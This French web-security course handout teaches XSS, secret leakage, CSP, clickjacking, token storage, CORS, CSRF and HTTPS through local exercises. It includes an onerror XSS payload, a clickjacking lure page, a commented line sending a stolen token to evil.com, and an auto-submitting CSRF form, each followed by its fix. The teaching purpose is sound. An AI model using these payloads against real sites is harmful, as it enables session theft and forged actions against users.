# Séance 7 - L'ABC de la sécurité côté client

Dernière ligne droite pour notre Single Page Application. Au cours de cette séance, vous allez identifier les faiblesses de sécurité des SPA et mettre en place des solutions adaptées.

Chaque exercice suit le même schéma : **observer la vulnérabilité → l'exploiter → la corriger**.

L'application tourne en local sur `http://localhost:3000`. Pour démarrer:

```bash
cd 07-spa-security
npm install
npm run dev
```

## Exercice 1 — XSS (Cross-Site Scripting)

### Objectif

Comprendre comment du contenu non filtré injecté dans le DOM peut exécuter du code arbitraire dans le navigateur d'un autre utilisateur.

### 1. Observer la vulnérabilité

Ouvre `src/components/SpotCard.js`. Le composant retourne une chaîne HTML interpolée avec
les données du spot. Cette chaîne est ensuite injectée dans le DOM via `innerHTML`
(voir `src/router/Router.js`, ligne 125 : `app.innerHTML = Layout({ content: html })`).

Repère ces lignes dans `SpotCard.js` :

```js
// ligne 9
<img src="${image}" alt="${name}" … />

// ligne 17
<h3>${name}</h3>
```

Les valeurs `name`, `type`, etc. sont interpolées directement dans du HTML.
Si ces valeurs contiennent des balises, le navigateur les interprète comme du vrai HTML.

### 2. Reproduire l'attaque

Ouvre `mock/fishspots.mock.js` et ajoute ce spot à la liste `data`:

```js
{
  id: 5,
  name: '<img src=x onerror="alert(\'XSS : \' + document.cookie)">',
  type: 'Lac',
  fishs: ['Carpe'],
  rating: 5,
  image: 'https://picsum.photos/seed/xss/400/300',
},
```

Recharge la page. Une alerte s'affiche immédiatement. Elle est déclenchée par l'attribut
`onerror` : le navigateur tente de charger `src=x` (image invalide), échoue, et exécute le
code JavaScript de `onerror`.

> **Ce que ça signifie en conditions réelles:** si les données viennent d'un vrai serveur et
> qu'un utilisateur malveillant a pu sauvegarder ce nom en base, le script s'exécute pour
> *tous* les visiteurs qui chargent la page — sans aucune interaction de leur part.

### 3. Comprendre pourquoi ça marche

Dans DevTools (`F12`), onglet **Elements**, cherche la balise `<article>` correspondant au spot
injecté. Tu verras que le `<img onerror=…>` est présent dans le DOM en tant qu'élément HTML
à part entière, et non comme du texte brut. C'est la différence entre `innerHTML`
(interprète le HTML) et `textContent` (traite tout comme du texte).

### 4. Corriger avec DOMPurify

Installe la librairie :

```bash
npm install dompurify
```

En haut de `src/components/SpotCard.js`, importe-la :

```js
import DOMPurify from 'dompurify';
```

Puis *sanitize* les valeurs avant interpolation:

```js
export function SpotCard(props) {
  const { id, name, type, fishs = [], image } = props;

  const safeName  = DOMPurify.sanitize(name);
  const safeType  = DOMPurify.sanitize(type);
  // Pour une URL, DOMPurify sanitize le HTML mais ne valide pas le schéma —
  // on s'assure donc que l'URL commence bien par https://
  const safeImage = image.startsWith('https://') ? image : '';

  return `
    <article … onclick="window.location.href='/spots/${id}'">
      …
      <img src="${safeImage}" alt="${safeName}" … />
      …
      <h3>${safeName}</h3>
      …
      <span>${safeType}</span>
      …
    </article>
  `;
}
```

Recharge: l'alerte n'apparaît plus. DOMPurify a supprimé l'attribut `onerror` avantl'injection dans le DOM.

> **Règle générale:** tout contenu dynamique injecté via `innerHTML` doit être assaini.
> Quand c'est possible, utilise `textContent` à la place — c'est encore plus sûr, car le
> navigateur ne peut jamais interpréter le texte comme du HTML.
>
> **Note architecturale:** DOMPurify est un filet de sécurité, pas une solution de fond.
> Dans une vraie app vanilla JS, construire le DOM programmatiquement (`createElement` +
> `textContent`) est préférable à sanitizer des template strings — on supprime le problème
> à la source plutôt que de le corriger après coup.
> **Identification.** L'utilisation de `innerHTML`, `document.write`, `eval`, ou l'insertion de contenu utilisateur non échappé dans le DOM doit attirer ton attention.

---

## Exercice 2 — Secrets et variables d'environnement

### Objectif

Comprendre pourquoi les variables d'environnement préfixées `VITE_` sont publiques par design.

### 1. Créer une variable d'environnement « secrète »

À la racine du dossier `07-spa-security`, crée un fichier `.env` :

```
VITE_API_KEY=sk_live_super_secret_123
```

Dans `src/config/constants.js`, ajoute cette ligne :

```js
export const API_KEY = import.meta.env.VITE_API_KEY;
```

Lance le serveur dev. Note que Vite affiche un warning dans le terminal pour les valeurs
qui ressemblent à de vraies clés secrètes (préfixe `sk_`) — c'est intentionnel.

Ouvre la console DevTools (`F12`, onglet **Console**) et tape:

```js
import('/src/config/constants.js').then(m => console.log(m.API_KEY))
```

La valeur `sk_live_super_secret_123` s'affiche. Elle est disponible dans le navigateur.

### 2. Constater la fuite dans le bundle de production

Arrête le serveur et lance le build:

```bash
npm run build
```

Ouvre le dossier `dist/assets/`. Il contient un fichier `index-[hash].js`. Ouvre-le dans ton
éditeur et cherche `sk_live_super_secret_123` (`Ctrl+F`). La clé apparaît **en clair** dans le
bundle JavaScript qui sera téléchargé par chaque visiteur.

### 3. Comprendre le mécanisme

Vite remplace statiquement `import.meta.env.VITE_*` au moment du build. C'est un **remplacement
de texte à la compilation**, pas un accès sécurisé à un secret. Tout ce qui porte ce préfixe
finit littéralement dans le JavaScript public.

> **Ce que ça signifie en conditions réelles :** une clé Stripe, OpenAI ou SendGrid exposée
> ainsi permet à n'importe qui de faire des appels API à ton nom — et à tes frais.

### 4. La solution

Les secrets doivent rester côté serveur. L'architecture correcte:

```
Navigateur  →  ton backend  →  API tierce (avec la clé secrète)
```

Le backend expose un endpoint proxy sans jamais exposer la clé. Les seules choses pouvant
figurer dans `.env` sans risque sont des valeurs réellement publiques : URL de l'API publique,
identifiant de projet analytics, etc.

> **Nettoie :** supprime la ligne `VITE_API_KEY` du `.env` et de `constants.js`
> avant de continuer.

---

## Exercice 3 — CSP (Content Security Policy)

Content Security Policy (CSP) est un en-tête HTTP qui indique au navigateur quelles sources de contenu (scripts, styles, images) sont autorisées.

### A quoi ça sert ?

Limiter les dégâts d’une injection XSS en bloquant l’exécution de scripts non autorisés.

### Mise en place

Ajouter l’en-tête `Content-Security-Policy` dans la réponse HTTP ou via une balise `<meta>`. Exemple minimal :

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com
```

### Objectif

Ajouter une couche de défense contre le XSS en restreignant les sources de contenu autorisées
par le navigateur.

> **Note préalable :** en production, la CSP doit être envoyée en **en-tête HTTP** — c'est
> la seule façon de bénéficier de toutes les directives (`frame-ancestors`, `report-uri`…).
> Ici on utilise la balise `<meta>` faute de backend, mais gardez en tête que c'est une
> approximation pour l'exercice local.

### 1. Ajouter une CSP minimale

Dans `src/index.html`, ajoute cette balise dans le `<head>` (après `<meta charset="UTF-8">`) :

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

Recharge la page. Dans DevTools (`F12`), onglet **Console**, tu vois des erreurs du type:

```
Refused to load the image 'https://picsum.photos/…' because it violates
the following Content Security Policy directive: "default-src 'self'"
```

Les images venant de `picsum.photos` et les polices Google Fonts sont bloquées.
La politique `default-src 'self'` n'autorise que les ressources servies par la même origine
que la page (`localhost:3000`).

### 2. Affiner progressivement

Modifie la balise `<meta>` pour autoriser les sources nécessaires:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    img-src 'self' https://picsum.photos;
    style-src 'self' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
  "
>
```

Recharge — les images et polices sont de retour. La console ne signale plus de violations.

### 3. Comprendre le lien avec le XSS

La CSP ne supprime pas la vulnérabilité XSS de l'exercice 1, mais elle en limite les dégâts.
Par exemple, si `script-src 'self'` est actif, un script injecté ne peut pas charger du
JavaScript depuis un domaine externe.

En revanche, si tu ajoutes `'unsafe-inline'` à `script-src`, la CSP devient inefficace contre
les scripts inline (exactement le type de payload de l'exercice 1). Essaie :

```html
content="default-src 'self'; script-src 'self' 'unsafe-inline'"
```

Réinjecte le spot malveillant de l'exercice 1 — l'alerte réapparaît malgré la CSP.
C'est pourquoi `'unsafe-inline'` est à proscrire.

### 4. Bonus — protection contre le clickjacking via CSP

Ajoute `frame-ancestors 'none'` à la politique :

```html
content="… ; frame-ancestors 'none';"
```

Cela interdit à n'importe quelle page d'embarquer ton app dans un `<iframe>`. C'est
l'équivalent moderne de `X-Frame-Options: DENY` (voir exercice 4).

> **Rappel :** `frame-ancestors` fait partie des directives qui ne fonctionnent **pas** avec
> la balise `<meta>` — elle est ignorée par le navigateur dans ce contexte. En production,
> passe par l'en-tête HTTP.

---

## Exercice 4 — Clickjacking

**Exemple.** Un attaquant affiche votre app dans un iframe invisible et superpose un bouton trompeur ("Cliquez pour gagner"). L’utilisateur croit cliquer sur le bouton, mais déclenche une action dans votre app (ex. supprimer un compte).

**Identification.** Aucune protection contre l’inclusion en iframe. Le site peut être embarqué sur n’importe quelle page.

**Solution.** En-tête `X-Frame-Options: DENY` ou `SAMEORIGIN`. Ou via CSP : `frame-ancestors 'self'`.

### Objectif

Comprendre comment une iframe invisible peut piéger un utilisateur en lui faisant effectuer
une action sans le savoir.

### 1. Monter l'attaque

En dehors du dossier du projet (par exemple sur le Bureau), crée un fichier `attacker.html`
avec ce contenu :

```html
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Gagner un iPhone !</title>
  <style>
    body { margin: 0; font-family: sans-serif; }

    #lure {
      position: absolute;
      top: 160px;
      left: 80px;
      z-index: 2;
      background: #ff4444;
      color: white;
      font-size: 24px;
      padding: 20px 40px;
      border-radius: 8px;
      cursor: pointer;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.005; /* quasi invisible */
      z-index: 3;
      border: none;
    }
  </style>
</head>
<body>
  <h1>🎉 Félicitations ! Vous avez gagné un iPhone !</h1>
  <button id="lure">Cliquez ici pour récupérer votre lot</button>
  <iframe src="http://localhost:3000"></iframe>
</body>
</html>
```

Assure-toi que Fishspots tourne (`npm run dev`). Ouvre `attacker.html` directement dans le
navigateur (via **Fichier > Ouvrir**, ou en glissant le fichier dans l'onglet).

L'app Fishspots se charge dans l'iframe, quasiment invisible. Le bouton rouge est *sous* l'iframe — c'est l'iframe qui capte les clics. L'utilisateur croit cliquer sur le bouton, mais clique en réalité sur l'app.

Dans DevTools (`F12`), onglet **Elements**, sélectionne l'`<iframe>` et change temporairement son `opacity` à `0.3` pour voir la superposition.

### 2. Corriger avec X-Frame-Options

Dans `src/index.html`, ajoute dans le `<head>`:

```html
<meta http-equiv="X-Frame-Options" content="DENY">
```

Recharge `attacker.html`. Le navigateur bloque le chargement de l'iframe et affiche dans la console DevTools:

```
Refused to display 'http://localhost:3000/' in a frame because it set
'X-Frame-Options' to 'deny'.
```

> **Alternative moderne :** via CSP, `frame-ancestors 'none'` a le même effet et est
> préférable car il prend en charge les sous-frames et les workers. Les deux peuvent coexister
> pour maximiser la compatibilité navigateur.

---

## Exercice 5 — Stockage côté client : localStorage vs cookies HttpOnly

Cet exercice se fait entièrement dans DevTools, sans modifier le code.

### Objectif

Comprendre pourquoi stocker un token d'authentification dans `localStorage` l'expose
au vol via une faille XSS.

### 1. Simuler un stockage de token dans localStorage

Ouvre l'app (`http://localhost:3000`). Dans DevTools (`F12`), onglet **Console**, tape :

```js
localStorage.setItem(
  'token',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UifQ.fake'
);
```

Va ensuite dans l'onglet **Application** (ou **Stockage** sur Firefox), section
**Local Storage > http://localhost:3000**. Le token est visible en clair.

### 2. Simuler le vol via XSS

Dans la console, exécute:

```js
const token = localStorage.getItem('token');
console.log('Token volé :', token);

// En conditions réelles, le script enverrait ça à un serveur attaquant :
// fetch('https://evil.com/steal?t=' + token);
```

N'importe quel script injecté via XSS peut faire exactement ça. `localStorage` est accessible
à **tout le JavaScript de la page**, qu'il soit légitime ou malveillant.

### 3. Contraster avec un cookie HttpOnly

Dans la console, tape :

```js
document.cookie
```

Tu obtiens les cookies **non-HttpOnly** de la page (chaîne vide si aucun n'est défini).
Maintenant, si un serveur posait un cookie avec l'attribut `HttpOnly` :

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Ce cookie est **invisible à JavaScript**. `document.cookie` ne le retourne pas.
Un script XSS ne peut pas le lire ni l'exfiltrer.

Pour le visualiser: onglet **Application > Cookies**, regarde la colonne **HttpOnly**
(cochée pour les cookies protégés). Le cookie est là pour le navigateur, mais inaccessible
au code JS de la page.

### 4. Résumé des règles

| Cas d'usage | Stockage recommandé |
|---|---|
| Thème (clair/sombre), langue, préférences UI | `localStorage` (données non sensibles) |
| Token de session, token d'authentification | Cookie `HttpOnly` + `Secure` |
| Panier e-commerce (non authentifié) | `localStorage` (données non sensibles) |
| Données personnelles ou médicales | Jamais côté client |

---

## Exercice 6 — Validation de formulaire

### Objectif

Implémenter un formulaire avec validation HTML5, puis montrer qu'elle est contournable —
et que la validation serveur reste indispensable.

### 1. Implémenter le formulaire

Ouvre `src/pages/AddSpotPage.js`. Remplace son contenu par le formulaire suivant:

```js
export async function AddSpotPage() {
  return `
    <div class="animate-[fadeIn_0.3s_ease] max-w-lg mx-auto">
      <h1>Ajouter un spot</h1>

      <form id="add-spot-form" class="flex flex-col gap-6 mt-6">

        <div class="flex flex-col gap-1">
          <label for="name">Nom du spot *</label>
          <input
            type="text"
            id="name"
            name="name"
            required
            minlength="3"
            maxlength="80"
            placeholder="Ex : Lac de la Forêt"
            class="border rounded px-3 py-2"
          />
          <span class="text-red-500 text-sm hidden" id="name-error">
            Le nom doit contenir entre 3 et 80 caractères.
          </span>
        </div>

        <div class="flex flex-col gap-1">
          <label for="type">Type de spot *</label>
          <select id="type" name="type" required class="border rounded px-3 py-2">
            <option value="">-- Choisir --</option>
            <option value="Lac">Lac</option>
            <option value="Rivière">Rivière</option>
            <option value="Étang">Étang</option>
            <option value="Canal">Canal</option>
            <option value="Mer">Mer</option>
          </select>
        </div>

        <div class="flex flex-col gap-1">
          <label>Poissons présents *</label>
          <div class="flex flex-wrap gap-3">
            ${['Carpe', 'Brochet', 'Sandre', 'Truite', 'Perche', 'Silure']
              .map(fish => `
                <label class="flex items-center gap-2 cursor-pointer">
                  <input type="checkbox" name="fishs" value="${fish}" />
                  ${fish}
                </label>
              `).join('')}
          </div>
        </div>

        <div class="flex flex-col gap-1">
          <label for="image">URL de l'image</label>
          <input
            type="url"
            id="image"
            name="image"
            placeholder="https://…"
            class="border rounded px-3 py-2"
          />
        </div>

        <button
          type="submit"
          class="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700"
        >
          Ajouter le spot
        </button>

      </form>
    </div>
  `;
}
```

Ensuite, ouvre `src/index.js` et ajoute ce listener **après** `router.start()` :

```js
// Gestion du formulaire d'ajout (event delegation — fonctionne après tout rendu innerHTML)
document.addEventListener('submit', (e) => {
  if (e.target.id !== 'add-spot-form') return;
  e.preventDefault();

  const form = e.target;
  const name  = form.querySelector('#name').value.trim();
  const type  = form.querySelector('#type').value;
  const fishs = [...form.querySelectorAll('[name="fishs"]:checked')]
    .map(cb => cb.value);

  // Validation manuelle
  let valid = true;

  if (name.length < 3) {
    document.getElementById('name-error').classList.remove('hidden');
    valid = false;
  } else {
    document.getElementById('name-error').classList.add('hidden');
  }

  if (!valid) return;

  console.log('Spot soumis :', { name, type, fishs });
  alert(`Spot "${name}" ajouté ! (simulation)`);
});
```

> **Pourquoi `document.addEventListener` et non `form.addEventListener` ?** Parce que
> l'app reconstruit le DOM via `innerHTML` à chaque navigation. Le formulaire n'existe
> pas encore quand `index.js` s'exécute — un listener sur un élément inexistant serait
> silencieusement ignoré. La délégation d'événement sur `document` fonctionne quelle
> que soit la vie du DOM.

Navigue vers `/spots/new` et teste : soumets avec un nom trop court. Le message d'erreur s'affiche. Soumets avec des données valides — l'alerte de confirmation apparaît.

### 2. Contourner la validation côté client

Dans DevTools (`F12`), onglet **Elements**, sélectionne l'`<input id="name">`.
Double-clique sur la valeur de l'attribut `minlength="3"` et change-la en `0`.
Tu peux aussi faire un clic droit sur l'attribut `required` > **Delete attribute**.

Soumets le formulaire avec un nom vide. Le spot passe sans erreur.

> **Ce que ça signifie :** n'importe qui peut modifier les attributs HTML dans DevTools,
> ou construire une requête HTTP directement avec `curl` ou Postman, sans passer par le
> formulaire. **La validation côté client ne protège jamais le serveur.** Elle est là pour
> l'expérience utilisateur — le retour immédiat — pas pour la sécurité.

### 3. Bonus — validation avec Zod

Installe Zod :

```bash
npm install zod
```

Crée un fichier `src/lib/spotSchema.js` pour y centraliser le schéma:

```js
import { z } from 'zod';

export const SpotSchema = z.object({
  name:  z.string().min(3, 'Minimum 3 caractères').max(80),
  type:  z.enum(['Lac', 'Rivière', 'Étang', 'Canal', 'Mer'], {
           message: 'Type invalide',
         }),
  fishs: z.array(z.string()).min(1, 'Sélectionne au moins un poisson'),
  image: z.string().url('URL invalide').optional().or(z.literal('')),
});
```

Dans le handler de submit (`src/index.js`), importe le schéma et remplace la validation
manuelle :

```js
import { SpotSchema } from './lib/spotSchema.js';

// … dans le listener submit :
const result = SpotSchema.safeParse({ name, type, fishs });

if (!result.success) {
  console.error(result.error.flatten().fieldErrors);
  return;
}

console.log('Données validées :', result.data);
```

Zod retourne des erreurs structurées par champ. L'avantage : c'est la même librairie
qu'on utilise côté serveur — le schéma dans `src/lib/spotSchema.js` peut être importé
aussi bien par le frontend que par le backend, garantissant que les règles de validation
sont identiques des deux côtés.

---

## Exercice 7 — CORS

CORS (Cross-Origin Resource Sharing) est un mécanisme du navigateur qui restreint les requêtes vers une origine différente de celle de la page.

### A quoi ça sert ?

Empêcher qu’un site malveillant (ex. `evil.com`) appelle votre API depuis le navigateur d’une victime connectée.

### Mise en place

Côté serveur (backend), définir les en-têtes `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, etc. Ne pas utiliser `*` si des credentials sont envoyés. Exemple Express:

```js
app.use(cors({ origin: 'https://fishspots.onrender.com', credentials: true }));
```

### Objectif

Provoquer une erreur CORS, comprendre son origine, puis la résoudre côté serveur.

### 1. Créer un mini-serveur sans CORS

À la racine de `07-spa-security`, crée un fichier `api-server.mjs` :

```js
import express from 'express';

const app = express();

app.get('/api/fishspots', (req, res) => {
  res.json({
    code: 200,
    data: [
      {
        id: 1,
        name: 'Serveur Express',
        type: 'Lac',
        fishs: ['Carpe'],
        rating: 4,
        image: 'https://picsum.photos/seed/express/400/300',
      },
    ],
  });
});

app.listen(3001, () => {
  console.log('API en écoute sur http://localhost:3001');
});
```

Installe Express :

```bash
npm install express
```

Lance le serveur dans un second terminal :

```bash
node api-server.mjs
```

### 2. Pointer le frontend vers le serveur

Dans `src/services/fishspots.js`, modifie l'URL de fetch :

```js
// Avant
return fetch('/api/fishspots')

// Après
return fetch('http://localhost:3001/api/fishspots')
```

Recharge l'app. Dans DevTools (`F12`), onglet **Console** :

```
Access to fetch at 'http://localhost:3001/api/fishspots' from origin
'http://localhost:3000' has been blocked by CORS policy: No
'Access-Control-Allow-Origin' header is present on the requested resource.
```

Dans l'onglet **Network**, retrouve la requête et clique dessus. L'onglet **Headers** montre
que la réponse ne contient pas l'en-tête `Access-Control-Allow-Origin`. Le navigateur a bien
reçu la réponse du serveur, mais il la bloque et ne l'expose pas au code JavaScript.

> **Important :** CORS est une protection **du navigateur**, pas du serveur. Le serveur a
> répondu normalement — c'est le navigateur qui bloque. Un appel depuis `curl` ou Postman
> réussit sans problème, parce qu'ils n'implémentent pas CORS.

### 3. Activer CORS côté serveur

Installe le middleware :

```bash
npm install cors
```

Modifie `api-server.mjs` :

```js
import express from 'express';
import cors from 'cors';

const app = express();

app.use(cors({ origin: 'http://localhost:3000' }));

// … reste inchangé
```

Redémarre le serveur (`Ctrl+C`, puis `node api-server.mjs`). Recharge l'app — les spots
s'affichent.

Dans **Network > Headers**, la réponse contient maintenant :

```
Access-Control-Allow-Origin: http://localhost:3000
```

Le navigateur voit cet en-tête et autorise le code JavaScript à accéder à la réponse.

### 4. Le piège de `origin: '*'` avec credentials

Remplace la config par :

```js
app.use(cors({ origin: '*', credentials: true }));
```

Le serveur démarre normalement, mais le navigateur rejette la réponse. La combinaison
`Access-Control-Allow-Origin: *` avec `Access-Control-Allow-Credentials: true` est
**invalide par spécification** — le navigateur refuse d'exposer la réponse au code JavaScript.
Si les credentials (cookies, Authorization) sont envoyés, l'origine doit être explicite —
jamais `*`.

> **Règle :** dès qu'on envoie des cookies ou des tokens d'authentification, `origin` doit
> être une URL précise.

### 5. Alternative : le proxy Vite en développement

Dans `vite.config.js`, on peut configurer un proxy pour éviter CORS pendant le développement :

```js
export default {
  server: {
    proxy: {
      '/api': 'http://localhost:3001',
    },
  },
};
```

Avec cette config, `fetch('/api/fishspots')` depuis `localhost:3000` est proxifié vers
`localhost:3001` par Vite — même origine du point de vue du navigateur, donc pas de CORS.
C'est une solution **de développement uniquement** ; en production, le vrai CORS doit être
configuré côté serveur.

> **Nettoie :** remets `fetch('/api/fishspots')` dans `src/services/fishspots.js` pour
> réutiliser le mock Vite.

---

## Exercice 8 — CSRF (Cross-Site Request Forgery)

**Exemple.** L’utilisateur est connecté sur `fishspots.com`. Un site malveillant contient un formulaire ou une image qui envoie une requête POST vers `fishspots.com/api/spots/delete/1`. Le navigateur envoie automatiquement les cookies de session. La requête est exécutée sans consentement.

**Identification.** Requêtes sensibles (POST, PUT, DELETE) qui s’appuient uniquement sur les cookies. Pas de token anti-CSRF.

**Solution.** Utiliser un token CSRF dans un champ caché ou un header personnalisé, validé côté serveur. Ou cookies `SameSite=Strict` / `Lax` pour limiter l’envoi cross-site.

### Objectif

Comprendre l'attaque CSRF sans avoir besoin de monter un backend complet.

### 1. Explication conceptuelle

CSRF exploite la confiance qu'un serveur accorde automatiquement aux cookies de session.
Le scénario :

1. Alice est connectée sur `fishspots.com` — son navigateur stocke un cookie de session.
2. Alice visite `evil.com` dans un autre onglet.
3. `evil.com` contient un formulaire caché qui pointe vers `fishspots.com/api/spots/delete/42`.
4. Le formulaire se soumet automatiquement via JavaScript au chargement de la page.
5. Le navigateur d'Alice envoie ses cookies `fishspots.com` avec la requête — automatiquement,
   comme pour n'importe quelle requête vers ce domaine.
6. Le serveur reçoit une requête authentifiée et supprime le spot — sans qu'Alice l'ait voulu.

La différence avec XSS: CSRF n'a pas besoin d'injecter du code dans l'app cible. Il suffit
que le navigateur de la victime soit connecté et visite une page malveillante.

### 2. Simuler l'attaque en local

Pour rendre la chose concrète sans monter un backend, crée un fichier `csrf-demo.html` en dehors du projet (par exemple sur le bureau):

```html
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>evil.com</title>
</head>
<body>
  <h1>Page piégée</h1>
  <p>La requête ci-dessous se soumet silencieusement au chargement.</p>

  <form id="csrf-form" action="http://localhost:3001/api/spots/delete/42" method="POST">
    <input type="hidden" name="confirm" value="true" />
  </form>

  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

Assure-toi que ton serveur Express tourne (`node api-server.mjs`). Ouvre `csrf-demo.html`
dans le navigateur. Dans DevTools (`F12`), onglet **Network**, observe la requête POST
partir vers `localhost:3001` — avec les cookies du domaine attachés automatiquement par le
navigateur.

### 3. Observer les cookies SameSite dans DevTools

Ouvre DevTools (`F12`), onglet **Application > Cookies**. Pour chaque cookie, repère la
colonne **SameSite** :

| Valeur | Comportement | Cas d'usage typique |
|---|---|---|
| `Strict` | le cookie n'est jamais envoyé dans une requête cross-site. Protection totale. | Sessions très sensibles (banque, admin) |
| `Lax` (défaut moderne) | envoyé uniquement pour les navigations GET de premier niveau (clic sur un lien). Bloque les POST cross-site. | La plupart des apps |
| `None` | toujours envoyé. Requiert `Secure`. Vulnérable au CSRF si mal protégé. | Widgets tiers, iframes cross-site |

Les navigateurs modernes appliquent `Lax` par défaut si `SameSite` n'est pas précisé — ce
qui réduit considérablement la surface d'attaque CSRF sans configuration supplémentaire.

### 4. Pratique déléguée — PortSwigger Labs

Pour exploiter CSRF dans un environnement contrôlé et préconfiguré :

1. Crée un compte gratuit sur [portswigger.net/web-security](https://portswigger.net/web-security).
2. Accède aux labs CSRF : [portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf).
3. Commence par **"CSRF vulnerability with no defenses"** — aucune infra à monter, tout est
   fourni.

---

## Exercice 9 — HTTPS en production

HTTPS (HTTP Secure) chiffre les échanges entre le navigateur et le serveur via TLS. Les données ne transitent plus en clair.

### A quoi ça sert ?

Protéger les mots de passe, tokens, données personnelles contre l’écoute sur le réseau (man-in-the-middle).

### Mise en place

En production, utiliser un hébergeur qui fournit le certificat (Let’s Encrypt, etc.). En local, Vite sert déjà en HTTPS si besoin via `server.https`.

### Objectif

Déployer Fishspots sur un hébergeur qui gère le certificat TLS automatiquement et observer le résultat en conditions réelles.

### 1. Préparer le build

```bash
npm run build
```

Le dossier `dist/` contient l'app statique prête à déployer.

### 2. Déployer sur Netlify / Vercel / Render

Les trois plateformes offrent un free tier stable, une UI qui évolue peu, et HTTPS activé
automatiquement. Les étapes ci-dessous s'appliquent aux deux.

**Netlify:**
1. Crée un compte sur [netlify.com](https://netlify.com).
2. Tableau de bord → **Add new site > Deploy manually**.
3. Glisse le dossier `dist/` dans la zone de dépôt.
4. L'app est disponible en quelques secondes sur `https://[nom-généré].netlify.app`.

**Vercel:**
1. Crée un compte sur [vercel.com](https://vercel.com).
2. Tableau de bord → **Add New > Project**, connecte ton dépôt GitHub.
3. Vercel détecte Vite automatiquement et configure le build.
4. L'app est disponible sur `https://[nom-généré].vercel.app`.

**Render:**
1. Crée un compte sur [render.com](https://render.com).
2. Tableau de bord → **Add New > Static website**, connecte ton dépôt GitHub.
3. Render détecte Vite automatiquement et configure le build.
4. L'app est disponible sur `https://[nom-généré].onrender.com`.

Dans les trois cas, le cadenas est présent dans la barre d'adresse dès le premier déploiement
et le trafic HTTP est redirigé vers HTTPS automatiquement.

### 3. Ajouter des en-têtes de sécurité

**Sur Netlify**, crée un fichier `netlify.toml` à la racine du projet :

```toml
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = "default-src 'self'; img-src 'self' https://picsum.photos; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com;"
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
```

**Sur Vercel**, crée un fichier `vercel.json` à la racine :

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Content-Security-Policy", "value": "default-src 'self'; img-src 'self' https://picsum.photos; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com;" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" }
      ]
    }
  ]
}
```

Ces en-têtes HTTP sont plus robustes que les balises `<meta>` car ils s'appliquent à toutes
les ressources et supportent des directives que `<meta>` ignore (`frame-ancestors`,
`report-uri`, etc.).

---

## Récapitulatif

| # | Faille | Ce qu'on a fait |
|---|---|---|
| 1 | XSS | injection via `innerHTML`, sanitization avec DOMPurify, validation d'URL |
| 2 | Secrets `.env` | fuite dans le bundle, architecture proxy backend |
| 3 | CSP | politique `<meta>`, violations console, danger de `unsafe-inline` |
| 4 | Clickjacking | iframe invisible, `X-Frame-Options` |
| 5 | `localStorage` vs `HttpOnly` | vol de token via console, cookies inaccessibles au JS |
| 6 | Validation | contournement DevTools, schéma Zod partagé frontend/backend |
| 7 | CORS | erreur CORS, middleware Express, proxy Vite |
| 8 | CSRF | demo formulaire caché, cookies `SameSite`, labs PortSwigger |
| 9 | HTTPS | déploiement Netlify/Vercel, en-têtes de sécurité HTTP |

Les exercices 1 à 5 peuvent tenir dans une seule séance de 2h sans aucune infrastructure
externe. Les exercices 7 (CORS) et 9 (déploiement) peuvent être traités en dehors de la
séance ou regroupés en deuxième partie.

---

## Ressources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) – référentiel des vulnérabilités web
- [MDN - Content Security Policy](https://developer.mozilla.org/fr/docs/Web/HTTP/CSP)
- [MDN - CORS](https://developer.mozilla.org/fr/docs/Web/HTTP/CORS)
- [Render - Static Sites](https://render.com/docs/static-sites) – déploiement et headers personnalisés
- [PortSwigger - XSS](https://portswigger.net/web-security/cross-site-scripting) – tutoriels et labs
- [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
- [Jake Archibald - SameSite cookies](https://web.dev/samesite-cookies-explained/) – explication des cookies SameSite
- [laConsole - CSRF](https://laconsole.dev/formations/attaques-web/csrf) – comprendre l’attaque CSRF
- [Nouvelle-Techno - Jetons CSRF](https://nouvelle-techno.fr/articles/comprendre-les-jetons-csrf-et-securiser-vos-formulaires) – sécuriser les formulaires
